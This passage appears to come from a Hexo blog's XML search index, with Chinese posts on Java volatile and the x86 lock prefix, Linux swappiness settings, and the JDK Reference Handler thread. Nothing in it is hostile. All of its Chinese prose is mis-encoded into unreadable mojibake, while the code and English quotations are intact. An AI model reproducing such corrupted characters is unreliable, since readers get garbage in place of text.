<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* Installing</span><br><span class="line"></span><br><span class="line">Products are named like build/$OS-$LIBARCH/hsdis-$LIBARCH.so.  You can</span><br><span class="line">install them on your LD_LIBRARY_PATH, or inside of your JRE/JDK.  The</span><br><span class="line">search path in the JVM is:</span><br><span class="line"></span><br><span class="line">1. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/libhsdis-&lt;arch&gt;.so</span><br><span class="line">2. &lt;home&gt;/jre/lib/&lt;arch&gt;/&lt;vm&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">3. &lt;home&gt;/jre/lib/&lt;arch&gt;/hsdis-&lt;arch&gt;.so</span><br><span class="line">4. hsdis-&lt;arch&gt;.so  (using LD_LIBRARY_PATH)</span><br><span class="line"></span><br><span class="line">Note that there&apos;s a bug in hotspot versions prior to hs22 that causes</span><br><span class="line">steps 2 and 3 to fail when used with JDK7.</span><br><span class="line"></span><br><span class="line">Now test:</span><br><span class="line"></span><br><span class="line">  export LD_LIBRARY_PATH .../hsdis/build/$OS-$LIBARCH:$LD_LIBRARY_PATH</span><br><span class="line">  dargs=&apos;-XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly&apos;</span><br><span class="line">  dargs=$dargs&apos; -XX:PrintAssemblyOptions=hsdis-print-bytes&apos;</span><br><span class="line">  java $dargs -Xbatch CompileCommand=print,*String.hashCode HelloWorld</span><br><span class="line"></span><br><span class="line">If the product mode of the JVM does not accept -XX:+PrintAssembly,</span><br><span class="line">you do not have a version new enough to use the hsdis plugin.</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å°±æ˜¯æ”¾åˆ°jvmèƒ½å¤ŸåŠ è½½åˆ°çš„è·¯å¾„ä¸Š, ç„¶ååœ¨jvmçš„å¯åŠ¨å‚æ•°ä¸­åŠ å…¥<code>-XX:+PrintAssembly -Xcomp</code></p>
<blockquote>
<p>å‚æ•°-Xcompæ˜¯è®©è™šæ‹Ÿæœºä»¥ç¼–è¯‘æ¨¡å¼æ‰§è¡Œä»£ç ï¼Œè¿™æ ·ä»£ç å¯ä»¥å·æ‡’ï¼Œä¸éœ€è¦æ‰§è¡Œè¶³å¤Ÿæ¬¡æ•°æ¥é¢„çƒ­éƒ½èƒ½è§¦å‘JITç¼–è¯‘ã€‚</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°è¾“å‡º:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 0x00007f29294c0054: mov    %r12d,0xc(%rbp)</span><br><span class="line"> 0x00007f29294c0058: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::&lt;init&gt;@6 (line 40)</span><br><span class="line">//...</span><br><span class="line"> 0x00007f2929504fdc: shr    $0x9,%rax</span><br><span class="line"> 0x00007f2929504fe0: mov    $0x7f2924e3f000,%rdi</span><br><span class="line"> 0x00007f2929504fea: movb   $0x0,(%rax,%rdi,1)</span><br><span class="line"> 0x00007f2929504fee: lock addl $0x0,(%rsp)     ;*putfield helper</span><br><span class="line">                                               ; - com.air.jvm.VolatileTest$Foo::getHelper@27 (line 45)</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°å¤šå‡ºäº†ä¸€è¡Œ â€œlock addl $0x0,(%rsp)â€ï¼Œè¿™è¡Œä»£ç åªæ˜¯å¯¹ stack pointer åŠ  0ï¼Œæ— å«ä¹‰ã€‚<br>ä½† LOCK prefix çš„æŒ‡ä»¤ä¼šè§¦å‘å¤„ç†å™¨åšç‰¹æ®Šçš„æ“ä½œï¼ŒæŸ¥çœ‹ Intel 64 and IA-32 æ¶æ„å¼€å‘æ‰‹å†Œçš„ç›¸å…³èµ„æ–™ï¼š</p>
<p>â€œSynchronization mechanisms in multiple-processor systems may depend upon a strong memory-ordering model. Here, a program can use a locking instruction such as the XCHG instruction or the LOCK prefix to ensure that a read-modify-write operation on memory is carried out atomically. Locking operations typically operate like I/O operations in that they wait for all previous instructions to complete and for all buffered writes to drain to memory.â€</p>
<p>LOCK prefix ä¼šè§¦å‘ CPU ç¼“å­˜å›å†™åˆ°å†…å­˜ï¼Œè€Œåé€šè¿‡ CPU ç¼“å­˜ä¸€è‡´æ€§æœºåˆ¶ï¼Œä½¿å¾—å…¶å®ƒçº¿ç¨‹èƒ½å¤Ÿçœ‹åˆ°æœ€æ–°çš„å…±äº«å˜é‡ï¼Œå®ç°äº†å…±äº«å˜é‡å¯¹äºæ‰€æœ‰ CPU çš„å¯è§æ€§ã€‚</p>
<img src="/2018/07/08/volatile/cpu-cache.jpg">
<h3 id="new-Test-åšäº†ä»€ä¹ˆ"><a href="#new-Test-åšäº†ä»€ä¹ˆ" class="headerlink" title="new Test()åšäº†ä»€ä¹ˆ"></a><code>new Test()</code>åšäº†ä»€ä¹ˆ</h3><p>å‚è€ƒRå¤§åœ¨çŸ¥ä¹ä¸Šçš„è§£ç­”:</p>
<blockquote>
<p><code>new Test()</code><br>è¿™ä¸ªè¡¨è¾¾å¼çš„ä½œç”¨æ˜¯ï¼š</p>
<ol>
<li>åˆ›å»ºå¹¶é»˜è®¤åˆå§‹åŒ–ä¸€ä¸ªTestç±»å‹çš„å¯¹è±¡</li>
<li>è°ƒç”¨Testç±»çš„signatureä¸º <init>()V çš„æ„é€ å™¨</init></li>
<li>è¡¨è¾¾å¼çš„å€¼ä¸ºä¸€ä¸ªæŒ‡å‘è¿™ä¸ªæ–°å»ºå¯¹å®¶çš„å¼•ç”¨ã€‚</li>
</ol>
</blockquote>
<p>å¯¹åº”åˆ°ä¸Šé¢çš„å­—èŠ‚ç , æˆ‘ä»¬ä»åŒæ­¥å—çš„<code>monitorenter</code>å’Œ<code>monitorexit</code>æ‰¾åˆ°<code>new</code>å¯¹åº”çš„å­—èŠ‚ç å¦‚ä¸‹:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>: monitorenter</span><br><span class="line"><span class="number">11</span>: aload_0</span><br><span class="line">12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">15</span>: ifnonnull     <span class="number">30</span></span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">18</span>: aload_0</span><br><span class="line">19: new           #3                  // class Foo$Helper</span><br><span class="line"><span class="number">22</span>: dup</span><br><span class="line"><span class="number">23</span>: aload_0</span><br><span class="line">24: invokespecial #4                  // Method Foo$Helper."&lt;init&gt;":(LFoo;)V</span><br><span class="line">27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">30</span>: aload_1</span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">31</span>: monitorexit</span><br></pre></td></tr></table></figure>
<p>ç¨å¾®è¡¥å……ä¸‹å­—èŠ‚ç çš„æŒ‡ä»¤çŸ¥è¯†:</p>
<blockquote>
<p>aload_0 è·å–çš„æ˜¯æœ¬åœ°å˜é‡è¡¨ä¸­å¯¹è±¡çš„å¼•ç”¨ï¼Œaä»£è¡¨å¼•ç”¨ç±»å‹ï¼Œ0è¡¨ç¤ºæœ¬åœ°è¡¨é‡è¡¨ä¸­å˜é‡çš„ç´¢å¼•ï¼Œé€šå¸¸0è¿™ä¸ªä½ç½®çš„å¼•ç”¨ï¼Œä¸€èˆ¬éƒ½æ˜¯ this å¯¹è±¡ã€‚iload_0 è·å–çš„æ˜¯ ä¸‹æ ‡ä¸º 0 çš„æ•´æ•°ç±»å‹ã€‚<br>invokespecialä¼šæ¶ˆè€—æ‰æ“ä½œæ•°æ ˆé¡¶çš„å¼•ç”¨ä½œä¸ºä¼ ç»™æ„é€ å™¨çš„â€œthisâ€å‚æ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¸Œæœ›åœ¨invokespecialè°ƒç”¨ååœ¨æ“ä½œæ•°æ ˆé¡¶è¿˜ç»´æŒæœ‰ä¸€ä¸ªæŒ‡å‘æ–°å»ºå¯¹è±¡çš„å¼•ç”¨ï¼Œå°±å¾—åœ¨invokespecialä¹‹å‰å…ˆâ€œå¤åˆ¶â€ä¸€ä»½å¼•ç”¨â€”â€”è¿™å°±æ˜¯è¿™ä¸ªdupçš„æ¥æº<br>å¯ä»¥çœ‹åˆ°ï¼Œnewå­—èŠ‚ç æŒ‡ä»¤çš„ä½œç”¨æ˜¯, åˆ›å»ºæŒ‡å®šç±»å‹çš„å¯¹è±¡å®ä¾‹ã€å¯¹å…¶è¿›è¡Œé»˜è®¤åˆå§‹åŒ–ï¼Œå¹¶ä¸”å°†æŒ‡å‘è¯¥å®ä¾‹çš„ä¸€ä¸ªå¼•ç”¨å‹å…¥æ“ä½œæ•°æ ˆé¡¶ï¼›</p>
</blockquote>
<p>å› ä¸º<code>new</code>æ“ä½œå¹¶ä¸æ˜¯ä¸€ä¸ªåŸå­çš„æ“ä½œ, ä»–æ˜¯åˆ†äº†ä¸‰æ­¥çš„, å¦‚æœæ²¡æœ‰volatile, è¿™é‡Œå°±æœ‰å¯èƒ½å‘ç”Ÿé‡æ’åº, å¯¼è‡´å¦å¤–çš„çº¿ç¨‹æ‹¿åˆ°çš„æ˜¯ä¸€ä¸ªåˆå§‹åŒ–äº†ä¸€åŠçš„å¯¹è±¡.</p>
<h2 id="JMMè§„èŒƒ"><a href="#JMMè§„èŒƒ" class="headerlink" title="JMMè§„èŒƒ"></a>JMMè§„èŒƒ</h2><p><code>JMM</code>(JSR-133)è§„å®šäº†æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªå·¥ä½œå†…å­˜, </p>
<blockquote>
<p>Every thread is defined to have a working memory (an abstraction of caches and registers) in which to store values.<br>çº¿ç¨‹çš„å·¥ä½œå†…å­˜, ç†è§£ä¸ºcpuçš„cacheæˆ–è€…registerå°±è¡Œäº†. </p>
</blockquote>
<img src="/2018/07/08/volatile/cache.gif" title="cpuçš„cache">
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/" rel="external nofollow noopener noreferrer" target="_blank">The Java Memory Model</a></li>
<li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li>
<li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/CommunityReview.pdf" rel="external nofollow noopener noreferrer" target="_blank">JSR-133</a></li>
<li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html" rel="external nofollow noopener noreferrer" target="_blank">The â€œDouble-Checked Locking is Brokenâ€ Declaration</a></li>
<li><a href="https://www.zhihu.com/question/52749416" rel="external nofollow noopener noreferrer" target="_blank">å…³äºJVMå­—èŠ‚ç ä¸­dupæŒ‡ä»¤çš„é—®é¢˜ï¼Ÿ - çŸ¥ä¹</a></li>
<li><a href="https://tech.meituan.com/java-memory-reordering.html" rel="external nofollow noopener noreferrer" target="_blank">Javaå†…å­˜è®¿é—®é‡æ’åºçš„ç ”ç©¶ -</a></li>
<li><a href="https://blog.csdn.net/Marvel__Dead/article/details/75193914" rel="external nofollow noopener noreferrer" target="_blank">å­—èŠ‚ç æŒ‡ä»¤çº§åˆ«ä»i++è¯´åˆ°volatileï¼Œæ·±å…¥ç†è§£i++çš„çº¿ç¨‹å®‰å…¨é—®é¢˜ - CSDNåšå®¢</a></li>
<li><a href="https://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly" rel="external nofollow noopener noreferrer" target="_blank">c++ - What does the â€œlockâ€ instruction mean in x86 assembly? - Stack Overflow</a></li>
<li><a href="https://stackoverflow.com/questions/19652824/why-can-memorybarrier-be-implemented-as-a-call-to-xchg" rel="external nofollow noopener noreferrer" target="_blank">windows - why can MemoryBarrier be implemented as a call to xchg? - Stack Overflow</a></li>
<li><a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html" rel="external nofollow noopener noreferrer" target="_blank">IntelÂ® 64 and IA-32 Architectures Developerâ€™s Manual: Vol. 3A</a></li>
<li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li>
<li><a href="http://www.cnblogs.com/dolphin0520/p/3920373.html" rel="external nofollow noopener noreferrer" target="_blank">Javaå¹¶å‘ç¼–ç¨‹ï¼švolatileå…³é”®å­—è§£æ - æµ· å­ - åšå®¢å›­</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> volatile </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[swappiness]]></title>
      <url>http://qsli.github.io/2018/07/08/swap/</url>
      <content type="html"><![CDATA[<h2 id="sysctlä¸­å’Œswapç›¸å…³çš„å‚æ•°"><a href="#sysctlä¸­å’Œswapç›¸å…³çš„å‚æ•°" class="headerlink" title="sysctlä¸­å’Œswapç›¸å…³çš„å‚æ•°"></a>sysctlä¸­å’Œswapç›¸å…³çš„å‚æ•°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  sudo sysctl -a  | grep swap</span><br><span class="line">vm.swappiness = 0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Swappiness is a Linux kernel parameter that controls the relative weight given to swapping out of runtime memory, as opposed to dropping pages from the system page cache. Swappiness can be set to values between 0 and 100 inclusive. A low value causes the kernel to avoid swapping; a higher value causes the kernel to try to use swap space.<br>å–å€¼è¯´æ˜:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm.swappiness = 0ï¼Œè¡¨ç¤ºåªæœ‰åœ¨é¿å…OOMçš„æ—¶å€™æ‰è¿›è¡Œswapæ“ä½œï¼›(å¹¶ä¸æ˜¯å…³é—­swap)</span><br><span class="line">vm.swappiness = 60ï¼Œç³»ç»Ÿé»˜è®¤å€¼ï¼›</span><br><span class="line">vm.swappiness = 100ï¼Œç³»ç»Ÿä¸»åŠ¨çš„è¿›è¡Œswapæ“ä½œã€‚</span><br></pre></td></tr></table></figure>
<h2 id="å…³é—­swap"><a href="#å…³é—­swap" class="headerlink" title="å…³é—­swap"></a>å…³é—­swap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br><span class="line">sudo echo 0 | sudo tee /proc/sys/vm/swappiness</span><br><span class="line">sudo swapoff/swapon -a</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDcyMTQyNQ==&amp;mid=206046053&amp;idx=1&amp;sn=76f7a31003d80c3089c3a266e4b139e0&amp;3rd=MzA3MDU4NTYzMw==&amp;scene=6#rd" rel="external nofollow noopener noreferrer" target="_blank">QunaræŠ€æœ¯æ²™é¾™</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> swap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[javaä¸­çš„å¼•ç”¨]]></title>
      <url>http://qsli.github.io/2018/07/08/reference/</url>
      <content type="html"><![CDATA[<h2 id="jvmä¸­çš„Reference-Handlerçº¿ç¨‹"><a href="#jvmä¸­çš„Reference-Handlerçº¿ç¨‹" class="headerlink" title="jvmä¸­çš„Reference Handlerçº¿ç¨‹"></a>jvmä¸­çš„<code>Reference Handler</code>çº¿ç¨‹</h2><p>ç»å¸¸çœ‹<code>jstack</code>çš„è¾“å‡ºå°±ä¼šå‘ç°ä¸€ä¸ªå¸¸è§çš„çº¿ç¨‹ â€“ <code>Reference Handler</code>, å †æ ˆå¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;Reference Handler&quot; #2 daemon prio=10 os_prio=0 tid=0x00007f873013e000 nid=0x18d7 in Object.wait() [0x00007f873443b000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">	at java.lang.Object.wait(Native Method)</span><br><span class="line">	at java.lang.Object.wait(Object.java:502)</span><br><span class="line">	at java.lang.ref.Reference.tryHandlePending(Reference.java:191)</span><br><span class="line">	- locked &lt;0x00000000e0e1e9b8&gt; (a java.lang.ref.Reference$Lock)</span><br><span class="line">	at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)</span><br><span class="line"></span><br><span class="line">&quot;VM Thread&quot; os_prio=0 tid=0x00007f8730136800 nid=0x18d6 runnable</span><br></pre></td></tr></table></figure>
<p>çœ‹çº¿ç¨‹æ ˆ, æ‰§è¡Œåˆ°<code>Reference</code>ä¸‹çš„<code>tryHandlePending</code>æ–¹æ³•å°±æˆäº†<code>WAIT</code>çŠ¶æ€, å¸¦ç€å¥½å¥‡å¿ƒå»ç¿»ç¿»æºç .</p>
<h3 id="ä½•æ—¶å¯åŠ¨"><a href="#ä½•æ—¶å¯åŠ¨" class="headerlink" title="ä½•æ—¶å¯åŠ¨?"></a>ä½•æ—¶å¯åŠ¨?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Referenceç±»ä¸­çš„é™æ€ä»£ç å—</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line">        ThreadGroup tg = Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">for</span> (ThreadGroup tgn = tg;</span><br><span class="line">             tgn != <span class="keyword">null</span>;</span><br><span class="line">             tg = tgn, tgn = tg.getParent());</span><br><span class="line">        <span class="comment">// è¿™é‡Œåˆ›å»ºçº¿ç¨‹, ä¼ å…¥çº¿ç¨‹groupå’Œçº¿ç¨‹çš„åç§°, å †æ ˆä¸­çš„åç§°å°±æ¥è‡ªäºæ­¤</span></span><br><span class="line">        Thread handler = <span class="keyword">new</span> ReferenceHandler(tg, <span class="string">"Reference Handler"</span>);</span><br><span class="line">        <span class="comment">/* If there were a special system-only priority greater than</span></span><br><span class="line"><span class="comment">         * MAX_PRIORITY, it would be used here</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        handler.setPriority(Thread.MAX_PRIORITY);</span><br><span class="line">        handler.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">        handler.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// provide access in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaLangRefAccess(<span class="keyword">new</span> JavaLangRefAccess() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryHandlePendingReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> tryHandlePending(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>Reference</code>åœ¨è¢«åŠ è½½çš„æ—¶å€™å°±ä¼šè§¦å‘<code>static</code>é‡Œçš„ä»£ç æ‰§è¡Œ, å°±ä¼šåˆ›å»º<code>Reference Handler</code>çº¿ç¨‹å¹¶å¯åŠ¨.<br>è‡³äº<code>SharedSecrets</code>, è¿™ä¸ªç±»ç±»ä¼¼ä¸€ä¸ªHolder, ä¿å­˜äº†ä¸€äº›å¯¹è±¡çš„å¼•ç”¨, å¹¶æä¾›äº†ä¸€äº›get/setæ–¹æ³•.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SharedSecrets</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe unsafe = Unsafe.getUnsafe();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilJarAccess javaUtilJarAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangAccess javaLangAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangRefAccess javaLangRefAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOAccess javaIOAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetAccess javaNetAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetHttpCookieAccess javaNetHttpCookieAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNioAccess javaNioAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOFileDescriptorAccess javaIOFileDescriptorAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityProtectionDomainAccess javaSecurityProtectionDomainAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityAccess javaSecurityAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilZipFileAccess javaUtilZipFileAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaAWTAccess javaAWTAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaObjectInputStreamAccess javaObjectInputStreamAccess;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SharedSecrets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getterå’Œsetteræ–¹æ³•çœç•¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è¿™ä¸ªçº¿ç¨‹åšäº†ä»€ä¹ˆ"><a href="#è¿™ä¸ªçº¿ç¨‹åšäº†ä»€ä¹ˆ" class="headerlink" title="è¿™ä¸ªçº¿ç¨‹åšäº†ä»€ä¹ˆ?"></a>è¿™ä¸ªçº¿ç¨‹åšäº†ä»€ä¹ˆ?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.lang.ref.Reference.ReferenceHandler</span></span><br><span class="line">  <span class="comment">/* High-priority thread to enqueue pending References</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceHandler</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é‡‡ç”¨åå°„çš„æ–¹å¼è§¦å‘ç±»çš„åŠ è½½</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(clazz.getName(), <span class="keyword">true</span>, clazz.getClassLoader());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (Error) <span class="keyword">new</span> NoClassDefFoundError(e.getMessage()).initCause(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="comment">// pre-load and initialize InterruptedException and Cleaner classes</span></span><br><span class="line">            <span class="comment">// so that we don't get into trouble later in the run loop if there's</span></span><br><span class="line">            <span class="comment">// memory shortage while loading/initializing them lazily.</span></span><br><span class="line">            ensureClassInitialized(InterruptedException<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="comment">// å’ŒDirectMemoryç›¸å…³çš„Cleanerç±»</span></span><br><span class="line">            ensureClassInitialized(Cleaner<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceHandler(ThreadGroup g, String name) &#123;</span><br><span class="line">            <span class="keyword">super</span>(g, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">// è°ƒç”¨Referenceç±»çš„æ–¹æ³•</span></span><br><span class="line">                tryHandlePending(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªçº¿ç¨‹å…¶å®åªæ˜¯åœ¨æ­»å¾ªç¯ä¸­è°ƒç”¨äº†<code>Reference</code>çš„<code>tryHandlePending</code>æ¥æ¸…ç†æ— æ•ˆçš„<code>Reference</code>.</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Javaä¸­æœ‰å››ç§å¼•ç”¨, <code>StrongReference</code>, <code>SoftReference</code>, <code>WeakReference</code>, <code>PhantomReference</code>, é™¤äº†<code>StrongReference</code>å…¶ä»–çš„ä¸‰ç§éƒ½æœ‰å¯¹åº”çš„ç±»:</p>
<img src="/2018/07/08/reference/reference.jpg" title="Reference">
<h3 id="å¼•ç”¨çš„çŠ¶æ€"><a href="#å¼•ç”¨çš„çŠ¶æ€" class="headerlink" title="å¼•ç”¨çš„çŠ¶æ€"></a>å¼•ç”¨çš„çŠ¶æ€</h3><ul>
<li><code>Active</code>: Newly-created instances are Active.</li>
<li><code>Pending</code>: An element of the pending-Reference list, waiting to be enqueued by the Reference-handler thread.  Unregistered instances are never in this state.(æ²¡æœ‰æ³¨å†ŒReferenceQueueçš„ä¸ä¼šæœ‰è¿™ä¸ªçŠ¶æ€)</li>
<li><code>Enqueued</code>: An element of the queue with which the instance was registered when it was created.  When an instance is removed from its ReferenceQueue, it is made Inactive. Unregistered instances are never in this state.(æ²¡æœ‰æ³¨å†ŒReferenceQueueçš„ä¸ä¼šæœ‰è¿™ä¸ªçŠ¶æ€)</li>
